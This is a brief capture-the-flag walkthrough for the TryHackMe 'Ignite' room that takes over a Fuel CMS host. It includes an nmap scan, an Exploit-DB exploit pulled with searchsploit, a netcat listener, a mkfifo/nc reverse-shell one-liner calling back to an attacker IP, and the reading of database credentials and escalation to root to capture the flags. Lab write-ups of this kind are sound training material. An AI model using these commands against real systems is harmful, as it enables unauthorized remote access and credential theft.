---
description: https://tryhackme.com/room/ignite
---

# Ignite

### **User.txt**

```
nmap 10.10.118.134
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 18-11-32.png>)

```
searchsploit -w fuel
searchsploit -m 47138
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 21-02-01.png>)

```
nc -nvlp 4444
$ ls -a /home/
$ ls -a /home/www-data
$ cat /home/www-data/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 21-05-39.png>)

```bash
vim 47138.py
python 47138.py
cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.101.193 4444 >/tmp/f
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 21-05-19.png>)

### **Root.txt**

![](<../../.gitbook/assets/Screenshot from 2020-09-17 21-06-23.png>)

```
$ cat /var/www/html/fuel/application/config/database.php
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ su - root
$ cat root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 21-07-03.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-17 21-09-55.png>)

## :link: Support Material

{% embed url="https://www.exploit-db.com/exploits/47138" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}

